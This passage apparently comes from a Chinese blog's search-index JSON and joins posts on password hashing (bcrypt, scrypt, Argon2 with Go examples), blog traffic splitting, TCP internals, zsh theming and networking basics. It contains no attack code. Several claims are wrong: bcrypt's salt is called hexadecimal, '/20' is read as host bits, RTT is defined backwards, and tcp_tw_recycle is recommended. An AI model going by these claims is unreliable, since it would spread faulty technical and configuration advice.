哈希还是加密?\n\n哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要）而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。\n\n哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。哈希算法是不可逆的，而加密算法是可逆的。\n\n<!-- more -->\n\n哈希函数并不是专门用来设计存储用户密码的,不论如何，使用 MD5、MD5 加盐或者其他哈希的方式来存储密码都是不安全的.\n\n使用加密的方式存储密码相比于哈希加盐的方式，在一些安全意识和能力较差的公司和网站反而更容易导致密码的泄露和安全事故。\n\n\n\n哈希加盐的方式确实能够增加攻击者的成本，但是今天来看还远远不够，我们需要一种更加安全的方式来存储用户的密码，这也就是今天被广泛使用的慢哈希算法. \n\n慢哈希算法是为哈希密码而专门设计的，所以它是一个执行相对较慢的算法, 自己计算起来都慢, 那么破解起来也会非常慢.\n\n\n\n# 2. 破解哈希\n\n+ 暴力枚举法：简单粗暴地枚举出所有原文，并计算出它们的哈希值，看看哪个哈希值和给定的信息摘要一致。\n\n+ 字典法：黑客利用一个巨大的字典，存储尽可能多的原文和对应的哈希值。破解时通过密文直接反查明文。但存储一个这样的数据库，空间成本是惊人的。\n\n+ 彩虹表（rainbow）法：在字典法的基础上改进，以时间换空间。是现在破解哈希常用的办法。\n\n  \n\n  虽然彩虹表有着如此惊人的破解效率，但网站的安全人员仍然有办法防御彩虹表。最有效的方法就是“加盐”，即在密码的特定位置插入特定的字符串，这个特定字符串就是“盐（Salt）”，加盐后的密码经过哈希加密得到的哈希串与加盐前的哈希串完全不同，黑客用彩虹表得到的密码根本就不是真正的密码。即使黑客知道了“盐”的内容、加盐的位置，还需要对H函数和R函数进行修改，彩虹表也需要重新生成，因此加盐能大大增加利用彩虹表攻击的难度。\n  \n\n\n\n# 3. Bcrypt加密\n\nBcrypt内部自己实现了随机加盐处理。使用Bcrypt，每次加密后的密文是不一样的。对一个密码，Bcrypt每次生成的hash都不一样，那么它是如何进行校验的？\n\n虽然对同一个密码，每次生成的hash不一样，但是hash中包含了salt（hash产生过程：先随机生成salt，salt跟password进行hash）；\n\n在下次校验时，从hash中取出salt，salt跟password进行hash；得到的结果跟保存在DB中的hash进行比对。\n\n举个栗子，假如一个密文是 `$2a$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa`, 那么通过 `$` 分隔符我们可以得到下面三个信息:\n\n1. `2a` 表示的是用于此次计算的 bcrypt 算法版本；\n2. `10` 表示的是 `log_rounds` 值；\n3. `vI8aWBnW3fID.ZQ4/zo1G.q1lRps.9cGLcZEiGDMVr5yUP1KUOYTa` 是 salt 和加密文本的拼接值 (经过了 base 64 编码，前面 22 个字母是 salt 的十六进制值。\n\n\n\n# 4. PBKDF2，Scrypt，Bcrypt 和 ARGON2对比\n\n+ PBKDF2\n\nPBKDF2 被设计的很简单，它的基本原理是通过一个伪随机函数（例如 HMAC 函数），把明文和一个盐值作为输入参数，然后按照设置的计算强度因子重复进行运算，并最终产生密钥。\n\n这样的重复 hash 已经被认为足够安全，但也有人提出了不同意见，此类算法对于传统的 CPU 来说的确是足够安全，使用GPU阵列、或FPGA来破解PBKDF2仍相对容易。注意这里说的是相对，为了比较接下来提到的另外两种算法。\n\n+ BCrypt\n\nBCrypt 在1999年发明，由于使用GPU、FPGA的破解是基于它们相对于CPU的并行计算优势，因此BCrypt算法不仅设计为CPU运算密集，而且是内存IO密集。\n\n然而随着时间迁移，目前新的FPGA已经集成了很大的RAM（类型CPU缓存、大约几十兆），解决了内存密集IO的问题。\n\n+ Scrypt\n\nScrypt 于2009年产生，弥补了BCrypt的不足。它将CPU计算与内存使用开销提升了一个层次，不仅CPU运算需要指数时间开销，还需要指数内存IO开销。\n\n+ Argon2\n\nArgon2 有两个主要的版本：**Argon2i** 是对抗侧信道攻击的最安全选择，而 **Argon2d** 是抵抗 GPU 破解攻击的最安全选择。\n\n在 2019 年，我建议你以后不要使用PBKDF2 或 BCrypt，并强烈建议将 Argon2（最好是 **Argon2id**）用于最新系统。\n\nScrypt 是当 Argon2 不可用时的不二选择，但要记住，它在侧侧信道泄露方面也存在相同的问题。\n\n  \n\n# 5. 代码实现\n\n+ pbkdf2 不推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"crypto/sha256\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/pbkdf2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res1)) //'J!85|LU@\n  \n  \t// 加密后一样\n  \tres2 := pbkdf2.Key([]byte(passwd), []byte(salt), 10, 20, sha256.New)\n  \tfmt.Println(string(res2)) //'J!85|LU@\n  \n  }\n  ```\n\n  \n\n+ bcrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/bcrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \t\n    // cost默认是10,不要太小\n  \tres1, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res1)) //$2a$10$Y85p96ZRD1Sa5iU7M/ngku9MIFNkmAwEI38FvPT9dj628E8hPOU0K\n  \n  \t// 加密结果不一样\n  \tres2, _ := bcrypt.GenerateFromPassword([]byte(passwd), 10)\n  \tfmt.Println(string(res2)) //$2a$10$7xUWgmWB3te5OipBYx4aheUFz7dCcj7JLIpQW6D/Me1R4qljEIFy2\n  \n  \terr1 := bcrypt.CompareHashAndPassword(res1, []byte(passwd))\n  \tfmt.Println(err1) //nil\n  \n  \terr2 := bcrypt.CompareHashAndPassword(res1, []byte(\"random\"))\n  \tfmt.Println(err2) //crypto/bcrypt: hashedPassword is not the hash of the given password\n  }\n  ```\n\n+ scrypt 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/scrypt\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := []byte{0xc8, 0x28, 0xf2, 0x58, 0xa7, 0x6a, 0xad, 0x7b}\n  \n  \tres1, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res1)) //TCoi[DRt;IALuw}\n  \n  \tres2, _ := scrypt.Key([]byte(passwd), salt, 1<<15, 8, 1, 32)\n  \tfmt.Println(string(res2)) //TCoi[DRt;IALuw}\n  }\n  ```\n\n  \n\n+ argon2 推荐\n\n  ```go\n  package main\n  \n  import (\n  \t\"encoding/base64\"\n  \t\"fmt\"\n  \n  \t\"golang.org/x/crypto/argon2\"\n  )\n  \n  func main() {\n  \n  \tpasswd := \"levonfly\"\n  \tsalt := \"salt\"\n  \n  \tres1 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res1)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  \n  \tres2 := argon2.IDKey([]byte(passwd), []byte(salt), 3, 32, 4, 32)\n  \tfmt.Println(base64.StdEncoding.EncodeToString(res2)) //uEZgAbCSfDyd8VAMbcmSSZKpH/TQ9hh9VsblPFGuDjM\n  }\n  ```\n\n\n\n\n# 6. 数据库存储\n\n如果存储慢哈希的密码, 一般都是存储定长的. 如`char(60)`\n\n参考: https://stackoverflow.com/questions/247304/what-data-type-to-use-for-hashed-password-field-and-what-length/\n\n\n\n# 7. 参考资料\n\n+  https://draveness.me/whys-the-design-password-with-md5/\n\n+ https://github.com/luokuning/blogs/issues/9\n\n+ https://juejin.im/post/5e70c152518825491949886e\n\n+ https://www.jianshu.com/p/732d9d960411","tags":["密码"],"categories":["计算机基础"]},{"title":"加速博客访问国内外访问分流","url":"%2Fp%2F5ee5b7c.html","content":"\n\n\n不只一个人说过，我博客访问的速度真慢。 博客虽然只是记录个人学习历程的地方，但也要记得优化访问速度。 \n\n今天终于有时间折腾下，让网站在国内和国外各备份一份，然后国内的用户访问国内的coding，国外的用户访问国外的github。 \n\n<!-- more -->\n\n### 1. 国内使用coding加速\n\n+ 登录网站, https://wwww.coding.net/, 注册登录\n\n+ 创建项目时候选择DevOps项目, 此处用的自己的用户名`levonfly`, 仓库地址为`git@e.coding.net:levonfly/levonfly.git`\n\n+ 在个人设置里, 配置公钥\n\n+ `ssh -T git@e.coding.net -i ~/.ssh/github-unix2dos`  测试密钥是否能访问\n\n+ 修hexo配置文件\n\n  ```yaml\n  deploy:\n      -\n       type: git\n       repo:\n          github: git@unix2dos:unix2dos/unix2dos.github.io.git # github地址\n          coding: git@e.coding.net:levonfly/levonfly.git #coding地址\n       branch: master\n  ```\n\n+ 修改ssh配置文件\n\n  ```yaml\n  Host coding e.coding.net\n  \tHostName e.coding.net\n  \tIdentityFile ~/.ssh/github-unix2dos # 自己的私钥\n  \tUser levonfly\n  ```\n\n+ 个人设置->实名认证\n\n+ 项目->持续部署->静态网站->发布网站->立即部署\n\n+ DNS解析 \n\n  CNAME->默认指向coding-pages.com\n\n  CNMA->境外指向github.io\n\n  我的域名`liuvv.com`解析如下\n\n  ```bash\n  主机 类型\t 线路\t 记录值\n  www\tCNAME\t境外\tunix2dos.github.io\n  www\tCNAME\t默认\tr8ea0k.coding-pages.com\n  ```\n\n  \n\n+ 证书申请失败\n\n  申请错误原因是：在验证域名所有权时会定位到 Github Pages 的主机上导致 SSL 证书申请失败\n\n  正确的做法是：先去域名 DNS 把 GitHub 的解析暂停掉，然后再重新申请 SSL 证书，大约十秒左右就能申请成功，然后开启强制 HTTPS 访问\n\n  \n\n+ 测试\n\n  ```bash\n  host www.liuvv.com   # 国内测试\n  www.liuvv.com is an alias for r8ea0k.coding-pages.com.\n  r8ea0k.coding-pages.com has address 150.109.4.162\n  r8ea0k.coding-pages.com has address 119.28.218.218\n  \n  \n  host www.liuvv.com  # 国外服务器测试\n  www.liuvv.com is an alias for unix2dos.github.io.\n  unix2dos.github.io has address 185.199.109.153\n  unix2dos.github.io has address 185.199.111.153\n  unix2dos.github.io has address 185.199.108.153\n  unix2dos.github.io has address 185.199.110.153\n  ```\n\n  \n\n  另外可开启和关闭vpn, 刷新博客, 看证书的有效期也能看到区别, 国内外访问同一个地址, 实现了分流. 至此加速大功告成.\n\n\n\n### 2. 其他方案\n\n还有一种方案是把生成的静态文件放在国内的CDN上, 来进行加速\n\n可参考https://github.com/saltbo/uptoc\n\n\n\n### 3. 参考资料\n\n+ https://www.cnblogs.com/sunhang32/p/11969964.html \n+ https://github.com/saltbo/uptoc\n\n","tags":["blog"],"categories":["个人记录"]},{"title":"tcp介绍和tcp建立连接过程","url":"%2Fp%2F289c4599.html","content":"\n# 1. tcp 介绍和 udp 区别\n\n|          | TCP                                                          | UDP                                       |\n| -------- | ------------------------------------------------------------ | ----------------------------------------- |\n| 数据传输 | 3报文握手+数据传输+4报文挥手                                 | 数据传输                                  |\n| 连接方式 | 单播(一对一)                                                 | 单播(一对一), 多播(一对多), 广播 (一对全) |\n| 应用报文 | 一系列字节流放到缓存中, 通过滑动窗口策略发送<br>发送方加个 TCP 头部<br>接收方取出字节流,组合送给接收方进程 | 每个报文添加个UDP首部                     |\n| 首部     | 最小20字节, 最大60字节                                       | 8字节                                     |\n\n<!-- more -->\n\n![1](tcp介绍和tcp建立连接过程/1.png)\n\n\n\n# 2. tcp连接\n\n![1](tcp介绍和tcp建立连接过程/2.png)\n\n![1](tcp介绍和tcp建立连接过程/3.png)\n\n\n\n### 2.1 建立连接\n\n##### 客户端\n\n1. 首先处于 closed 状态\n\n2. 创建传输控制快\n3. 发送握手①SYN=1 seq=x  进入**SYN-SENT**(同步已发送状态)\n\n4. 发送握手③ACK=1 seq=x+1 ack=y+1 进入 **ESTABLISHED**(连接已建立状态)\n\n5. 开始数据传输\n\n##### 服务端\n\n1. 首先处于 closed 状态\n\n2. 创建传输控制快\n\n  + tcp 连接表\n  + 指向发送和接收缓存的指针\n  + 指向重传队列的指针\n  + 当前的发送和接收序号\n\n3. listen 监听\n\n4. 发送握手② SYN=1 ACK=1 seq=y ack=x+1  进入**SYN-REVD**(同步已接收状态)\n\n5. 进入**ESTABLISHED**(连接已建立状态)\n\n6. 开始数据传输\n\n\n\n### 2.2 释放连接\n\n##### 主动端(可以是客户端,也可以是服务端)\n\n1. 发送挥手① FIN=1 ACK=1 seq=u  ack=v 进入 **FIN_WAIT_1**(终止等待1状态)\n\n2. 收到挥手②进入 **FIN_WAIT_2**(终止等待2状态)\n\n3. 接受数据\n\n4. 发送挥手④ ACK=1 seq=u+1 ack=w+1 进入 **TIME_WAIT**(时间等待状态)\n\n5. 经过2MSL后, 进入 **CLOSED**(关闭状态)\n\n##### 被动端(可以是客户端,也可以是服务端)\n\n1. 发送挥手② ACK=1 seq=v ack=u+1 并进入**CLOSE_WAIT**(关闭等待状态)\n\n2. 通知应用进程断开连接, 客户端到服务器方向连接关闭, 属于半关闭状态\n\n3. 发送未发完的数据\n\n4. 发送挥手③ FIN=1 ACK=1 seq=w ack=u+1 进入 **LAST-ACK**(最后确认状态)\n\n5. 收到挥手④后进入 **CLOSED**(关闭状态)\n\n\n\n# 3. tcp 连接问题\n\n### 3.1 为什么不用两次握手\n\n假如第一个连接发送失败, 重传后过了好久好久, 到达了。 \n\n服务器对失败后的连接又建立了一次请求, 但客户端可能处于关闭了都无法理会, 服务器就无法释放这个连接。\n\n\n\n### 3.2 为什么进入 TIME_WAIT 而不是直接关闭\n\n因为客户端发送挥手④的时候，有可能失败。\n\n如果客户端直接关闭, 服务器重发挥手③, 客户端处于关闭不响应, 服务器无法释放资源。\n\n\n\n### 3.3 CLOSE_WAIT 和 TIME_WAIT\n\n+ CLOSE_WAIT  被动关闭一方状态(关闭等待状态 )\n\n  被动端发送确认挥手②以后\n\n+ TIME_WAIT   主动关闭一方状态(时间等待状态)\n\n  主动端发送确认挥手④以后, 再等待2个2MSL\n\n  \n\n### 3.4 保活计时器的作用\n\n假如建立连接后, 客户端出现了故障\n\n+ 服务器每次收到请求后, 重新启动定时器(2小时)\n+ 服务器2小时后没收到客户端请求, 发送探测报文段\n+ 服务器75秒间隔发送一个, 达到10个无响应,关闭连接\n\n\n\n### 3.5 TIME_WAIT 过多\n\n一般情况服务器端不会出现TIME_WAIT状态，因为大多数情况都是客户端主动发起连接并主动关闭连接。\n\n但是某些服务如pop/smtp、ftp却是服务端收到客户端的QUIT命令后主动关闭连接，这就造成这类服务器上容易出现大量的TIME_WAIT状态的连接，而且并发量越大处于此种状态的连接越多。\n\n服务在主动关闭客户端非法请求或清理长时间不活动的连接时（这种情况很可能是客户端程序忘记关闭连接）也会出现TIME_WAIT的状态。TIME_WAIT 对于web服务器来说，占用了一个socket 60秒，socket的数量是有限的，最多65535。\n\n解决方案\n\n> 打开 sysctl.conf 文件，修改以下几个参数：\n\n- net.ipv4.tcp_tw_recycle = 1\t表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭\n- net.ipv4.tcp_tw_reuse = 1      重新使用TIME_WAIT状态的连接。\n- net.ipv4.tcp_timestamps = 1  两个4字节的时间戳字段，其中第一个4字节字段用来保存发送该数据包的时间，第二个4字节字段用来保存最近一次接收对方发送到数据的时间。有了这两个时间字段，也就有了后续优化的余地。\n\n\n\n\n\n# 4. tcp 头部字段\n\n### 4.1 头部格式\n\n20字节固定  + 最大40字节扩展\n\n### 4.2 固定20字节详情\n\n- [x] 源端口 2字节,  目的端口 2字节\n\n- [x] 序号 4字节 , 我发送的是以 n 开始的序号\n\n- [x] 确认号 4字节, 之前的都已经接收,下次希望给我传递 n,  ACK位置必须=1\n\n- [x] 数据偏移(说明头部字节是20还是到60) + 保留 + URG(紧急指针有效) + ACK + PSH(推送,尽快交给应用层) + RST(复位,重新建立连接) + SYN(tcp建立标志) + FIN(tcp释放标志) 一共2字节,     窗口2字节, 我的接收窗口大小 (例如rwnd=20)\n\n- [x] 检验和2字节(检错算法),  紧急指针2字节(帮忙取出紧急数据)\n\n\n\n### 4.3 扩展字段\n\n![1](tcp介绍和tcp建立连接过程/4.png)\n\n\n\n\n\n# 5. tcp 其他\n\n### 5.1 Nagle(內勾)算法\n\n（1）如果包长度达到MSS，则允许发送；\n\n（2）如果该包含有FIN，则允许发送；\n\n（3）设置了TCP_NODELAY选项，则允许发送；\n\n（4）未设置TCP_CORK选项时，***若所有发出去的小数据包（包长度小于MSS）均被确认，则允许发送；***\n\n（5）上述条件都未满足，但发生了超时（一般为200ms），则立即发送。\n\n\n\n+ 优点：避免网络中充斥着许多小数据块，降低网络负载，减少网络拥塞，提高网络吞吐\n\n+ 缺点：客户端的延迟会增加，实时性降低，不适合延时要求尽量小的场景；且对于大文件传输这种场景，会降低传输速度。\n\n用TCP_NODELAY选项可以禁止Negale 算法。此时，应用程序向内核递交的每个数据包都会立即发送出去。需要注意的是，虽然禁止了Negale 算法，但网络的传输仍然受到TCP确认延迟机制的影响。\n\n\n\n### 5.2 延迟确认\n\n接收方在收到数据后，并不会立即回复ACK, 而是延迟一定时间 或者 达到2x最大段数据长度为止 (不同操作系统实现并不一样)\n\n1. 这样做的目的是ACK是可以合并的，也就是指如果连续收到两个TCP包，并不一定需要ACK两次，只要回复最终的ACK就可以了，可以降低网络流量。\n2. 如果接收方有数据要发送，那么就会在发送数据的TCP数据包里，带上ACK信息。这样做，可以避免大量的ACK以一个单独的TCP包发送，减少了网络流量。\n\n\n\n\n### 5.3 Nagle和延迟确认一起使用产生的问题\n\n两种算法优点都有减小网络数据包的优点，但是都增加了网络通信的延时. 结合在一起就会有问题\n\n例如客户端发送一个数据报, 由于延时确认，服务端不是马上确认；\n\n若客户端启用nagle算法，要等到收到上一个数据报的确认在发送下一个数据报；\n\n如此以来，客户端和服务端相互等待，直到超时或者其他情况.\n\n\n\n# 6. 参考资料\n\n+ https://my.oschina.net/xinxingegeya/blog/485643\n+ https://blog.oldboyedu.com/tcp-wait/","tags":["tcp"],"categories":["网络"]},{"title":"tcp滑动窗口,拥塞控制和超时重传时间选择","url":"%2Fp%2F7eb83068.html","content":"\n\n\n# 1. 流量控制-滑动窗口\n\n\n\n![1](tcp滑动窗口和拥塞控制/1.png)\n\n<!-- more -->\n\n### 1.0 前提\n\nA->B     A 是发送方, B 是接收方,  各自有自己的滑动窗口\n\n### 1.1  B告诉A的窗口大小\n\n+ rwnd=20  我的窗口20个\n\n+ ack=31  下一次给老子发31\n\n\n\n### 1.2  A的窗口移动\n\n+  尾部\n  + 往前移动\n  + 不动, 因为在等待 ACK \n\n+ 头部\n  + 往前移动\n  + 不动, 等待\n  + 向后收缩, B 端的窗口变小了(不建议这么做)\n\n\n\n### 1.3 A窗口内三个指针\n\n+ P1 已经发送的位置, 未收取到 ACK\n+ P2 准备发送的位置\n+ P3 尾部\n\n\n\n### 1.4  B的窗口状态\n\n+ B 窗口内,  数据未按序到达, 只能现在缓存中,  因为B 只能按正确顺序发送ACK\n+ 如果 A 一只没有收到 ACK,还有超时重传机制\n\n![1](tcp滑动窗口和拥塞控制/2.png)\n\n### 1.5 总结\n\n+ A的窗口大小不一定和 B 说的一样\n  + 传说窗口值有时间滞后\n  + 网络拥塞情况\n\n+ B 的不按时序达到的数据如何处理, tcp 没有规定\n  + 直接丢弃, 简单, 效率差\n  + 缓存在窗口内, 等到收到连续了后, 再 ACK\n\n+ 为了增加效率,  tcp 要求接收方 B \n  + 累计确认, 多个一起确认\n  + 捎带确认. 发数据顺便确认, 不经常发生\n  + 不能太晚确认, 要不然 A 就超时重传\n\n+ 全双工通信\n  + 其实A和B都有发送窗口和接收窗口\n\n\n\n##### 1.6. 0窗口检测报文\n\n+ 没有缓存了, 也必须要接收检测或紧急报文\n\n![1](tcp滑动窗口和拥塞控制/4.png)\n\n\n\n# 2. 拥塞机制(通过算法调整拥塞窗口)\n\n出现拥塞不控制，吞吐量下降，类似堵车。\n\n### 2.0 前提\n\n数据发送 A->B,  B 有足够大的窗口, A 的拥塞窗口根据拥塞调节 \n\n+ > TCP 发送方A的发送窗口 = min(A的自身拥塞窗口, TCP接收方B的接收窗口)\n\n+ 接收窗口 rwnd (receive window)\n\n+ 发送窗口 swnd (send window)\n\n+ 拥塞窗口 cwnd (congestion window)\n\n\n\n\n>  判断拥塞依据, 是 A没有收到 B 的 ACK, A自己发生了超时重传。\n\n\n\n### 2.1 A的拥塞窗口大小(cwnd)和慢开始变量 ssthresh\n\n+ cwnd < ssthresh 慢开始算法\n\n\n+ cwnd >  ssthresh 拥塞避免算法\n+ cwnd =  ssthresh  两个算法都可以\n\n\n\n### 2.2 窗口变量的变化\n\ncwnd=1\n\nswnd=cwnd，因为取拥塞和接收最小值\n\nssthresh=16\n\n\n\n+ 慢开始算法开始  每次收到 ack, 就+1,  然后 +2,  + 4,  + 8 , 有种指数增长概念\n\n+ 到了16, 变成拥塞避免算法, 每次+1, 收到后再+1\n+ 出现了丢包情况,认为拥塞\n  + 将cwnd=1，直接到底。\n  + 将ssthresh=cwnd/2, 这个时候你开始拥塞了, 取我的一半好了\n+ 慢开始算法继续开始\n\n---\n\n### 2.3 快重传，快恢复，避免拥塞窗口直接变1\n\n> 有时候丢包, 是网络问题,并不是拥塞,但是你认为拥塞,  直接让窗口变1了怎么办?\n\n+ 启用快重传机制\n+ B 直接给 A 发送3个重复确认\n+ 发送方 A 收到了3个重复确认, 说明不是拥塞, 不用慢开始算法, 执行快恢复算法。\n\n+ \n+ 快恢复算法，直接将拥塞窗口和ssthresh等于当前的拥塞窗口的一半\n+ 因为相等，继续执行拥塞避免方法\n\n\n\n### 2.4 拥塞控制四个算法\n\n+ 慢开始, 指数增加\n\n  + 发送的报文少, 不点都不慢，反而指数增长\n\n+ 拥塞避免, 每次+1\n\n  + 不是避免拥塞, 是线性增长, 试试啥时候拥塞\n\n+ 快重传\n\n  B 数据未按序到达, 就一直发送想要的序号, 一直提醒 A, 让提早重传\n\n  + B要求 A 你快重传, 不要等计时器到了\n  + B立即发送确认, 如果不是正确顺序到达, 就发送之前正确顺序的重复确认(为了提醒 A)\n  + A 收到了3个连续的重复确认, 就应该立即重传\n\n+ 快恢复\n\n  + 将ssthresh和 cwnd都调整为当前窗口的一半,  他俩相等了再执行拥塞避免算法\n\n\n\n![1](tcp滑动窗口和拥塞控制/3.png)\n\n\n\n\n\n# 3. 超时重传时间的选择\n\n+ RTT往返时间 = 开始发送时间 -  收到时间\n\n+ RTO超时时间, 要略大于 RTT 时间\n\n\n\n![1](tcp滑动窗口和拥塞控制/5.png)\n\n\n\n随着环境的不一样, RTT样本差别大, 要计算加权平均\n\n但是如果重传了,由于分不清是对那个的回应, 就不计算了, 还是用以前的RTO*2\n\n![1](tcp滑动窗口和拥塞控制/6.png)","tags":["tcp"],"categories":["网络"]},{"title":"Zsh主题Powerlevel9k升级到Powerlevel10k","url":"%2Fp%2F4fd520f9.html","content":"\n\n\n为什么升级？Powerlevel9k项目不再维护，10更快更强大（10-100倍的性能提升）。\n\n并且完美兼容Powerlevel9k, 以前的配置参数可以不用任何修改.\n\n<!-- more -->\n\n### 1. 替换\n\n```bash\ngit clone --depth=1 https://github.com/romkatv/powerlevel10k.git $ZSH_CUSTOM/themes/powerlevel10k\n\n# Replace ZSH_THEME=\"powerlevel9k/powerlevel9k\" with ZSH_THEME=\"powerlevel10k/powerlevel10k\".\n```\n\n\n\n### 2. 配置\n\n可以通过 `p10k configure` 安装推荐字体. 也可以`p10k configure`进行傻瓜式主题配置. 不过还是建议自己定制.\n\n```\np10k configure\n```\n\n\n\n### 3. 我的配置\n\n```yaml\nPOWERLEVEL9K_MODE='nerdfont-complete'\nZSH_THEME=\"powerlevel10k/powerlevel10k\"\nPOWERLEVEL9K_CONTEXT_TEMPLATE='%n'\nPOWERLEVEL9K_CONTEXT_DEFAULT_FOREGROUND='white'\nPOWERLEVEL9K_PROMPT_ON_NEWLINE=true\nPOWERLEVEL9K_MULTILINE_LAST_PROMPT_PREFIX=\"%F{014}\\u2570%F{cyan}\\uF460%F{073}\\uF460%F{109}\\uF460%f \"\nPOWERLEVEL9K_SHORTEN_DIR_LENGTH=1\nPOWERLEVEL9K_NODE_VERSION_BACKGROUND=\"green\"\nPOWERLEVEL9K_NODE_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_GO_VERSION_BACKGROUND=\"red\"\nPOWERLEVEL9K_GO_VERSION_FOREGROUND=\"black\"\nPOWERLEVEL9K_LEFT_PROMPT_ELEMENTS=(os_icon context ssh dir vcs)\nPOWERLEVEL9K_RIGHT_PROMPT_ELEMENTS=(status ip anaconda node_version go_version)\n```\n\n\n\n### 4. 参考资料\n\n+ https://github.com/romkatv/powerlevel10k\n+ https://www.liuvv.com/p/6600d67c.html\n\n","tags":["iterm2"],"categories":["iterm2"]},{"title":"计算机网络简明教程","url":"%2Fp%2F57254ff8.html","content":"\n\n\n# 1. MAC地址\n\n是对网络上各接口的唯一标识, 注意而不是设备的唯一标识\n\n因为普通电脑就有线网卡和无线网卡, 交换机和路由器更是有多个 mac 地址\n<!-- more -->\n\n\n+ 单播 mac 地址  就是查看自己是否匹配, 匹配接受\n\n+ 广播 mac 地址  FF-FF-FF-FF-FF-FF, 接受\n\n+ 多播 mac 地址 看自己的是否在这个多播租, 在的话接受\n\n\n\n# 2. IP 地址\n\n在数据包的转发过程中, 源 ip地址和目的 ip 地址不变, 源 mac 地址和目的 mac 地址一直变\n\n\n\n# 3. ARP协议\n\n每个主机有自己的 arp 缓存表,  不知道别人的就需要发送 arp 报文\n\narp 缓存表有类型, 静态和动态,  一般是动态, 两分钟失效, 因为有可能你换 ip\n\narp 只能在同一个网络中使用, 不能跨网络询问\n\n\n\n# 4. 集线器和交换机\n\n集线器给以太网每个设备发送(物理层)\n\n交换机给目的主机发送(数据链路层,也包括物理层)\n\n\n\n集线器和交换机组成的网络属于同一个广播域,就是广播的都能收到\n\n交换机通过自学习的方法, 记录主机 mac 地址所对应的接口号\n\n\n\n为了以太网稳定, 一般冗余交换机线路连接, 但是有可能发生广播风暴(环), 可以通过生成树协议STP ,避免环路(最小生成树)\n\n\n\n# 5. VALN\n\n一个或多个交换机,不同的接口划分成多个 VLAN\n\n通过 VLAN缩小广播域, 还可以用路由器隔离广播域\n\n交换机接口类型: Access, Trunk, Hybrid(华为)\n\nVLAN 设置, 和主机连接的交换机用 ACCESS端口, 交换机互联的端口用 Trunk 端口\n\n\n\n# 6. IPV4\n\n### 6.1 分类编址\n\n网络号+主机号 4个字节32位\n\nA 类 0-127    网络号1个字节\n\nB 类 128-191  网络号2个字节\n\nC 类 192-223 网络号3个字节\n\nD 类  多播地址\n\nE 类  保留使用\n\n### 6.2 划分子网\n\n从主机号借用一部分给子网号,  有种从B类降级到C类的感觉\n\n子网掩码, 前面1代表网络号, 0代表主机号, 然后逻辑与运算, 得到子网的网络地址(网络起始的地址,xxx.xxx.xxx.0)\n\nC 类地址默认子网掩码就是255.255.255.0\n\n### 6.3 无分类编址\n\n忘记前两种方法\n\n128.14.35.7/20 表明20个是主机号\n\n\n\n![1](计算机网络简明教程/1.png)\n\n\n\n根据无分类, 路由选择最长前缀匹配, 认为越长,路由更具体\n\n\n\n# 7. IP数据报\n\n给别人发数据报, 先看自己和别人的网络地址是否一样, 不一样就不在一个网络, 要发给默认网关\n\n默认网关: 指定的转发路由器的 IP 地址\n\n到达路由器时, 检查路由条目, 匹配到正确的网络地址后转发\n\n路由器不转发广播地址\n\n\n\n### 7.1 路由表\n\n默认路由 0.0.0.0/0, \t\t\t\t 网络前缀最短,最模糊, 选择优先级最低\n\n特定路由 198.168.1.2/32        网络前缀最长,最具体, 选择优先级最高\n\n\n\n因为有默认路由的存在(少了路由条目发给默认路由, 不存在的网络也给默认路由), 容易发生路由环路的问题, 所以 IP 数据报有 TTL , 变成0了就丢弃\n\n\n\n### 7.2 路由选择协议\n\n一个网络,组成自治系统 AS\n\n两个AS 之间用外部网关协议 EGP\n\nAS内部用内部网关协议 IGP\n\n![1](计算机网络简明教程/2.png)\n\n\n\n##### 7.2.1 RIP 内部网关,UDP\n\n经过一个路由+1, 认为越短的路由就是好的路由, 跳数大于15,表明不可达\n\n如果距离一样, 可以负载均衡\n\n\n\n路由器仅和相邻路由器周期交换路由信息\n\n![1](计算机网络简明教程/3.png)\n\n\n\n##### 7.2.2 OSPF 内部网关,IP\n\n克服 RIP 缺点,1989年开发出\n\n路由器之间有代价, 采用最短路径算法(迪杰斯特拉)\n\n\n\n##### 7.2.3 BGP 外部网关,tcp\n\n只是能找到到达的比较好路由, 不是最佳路由\n\n不同的 AS自治系统发言人建立 tcp 连接,交流信息\n\n\n\n# 8. ipv4首部格式\n\n固定20字节+ 40字节可变部分\n\n### 8.1 固定20字节\n\n+ 版本4bit + 首部长度(4字节的整数倍) 4bit +区分服务 8bit + 总长度(首部+数据) 16bit \n+  标识 标志 片偏移   三个用于 ip数据报分片\n+ 生存时间TTL(以跳数对单位)协议8bit +   协议8bit(1 icmp 2 igmp 6tcp 17udp 41ipv6 89 ospf) + 首部检验和16bit(检测首部是否出错, ipv6不再检验)\n+ 源 IP地址  32bit\n+ 目的 IP地址 32bit\n\n\n\n### 8.2 IP数据报分片\n\n以太网数据载荷部分最大1500字节的限制(MTU), IP数据报太大的话, 需要分片发送\n\n![1](计算机网络简明教程/4.png)\n\n\n\n# 9. ICMP网际控制报文协议\n\n封装在 IP 数据报中发送, 向源点报错  和 向其他主机询问\n\n+ 差错报告报文\n  + 终点不可打\n  + 源点抑制\n  + 时间超过\n  + 参数问题\n  + 改变路由\n\n+ 询问报文\n  + 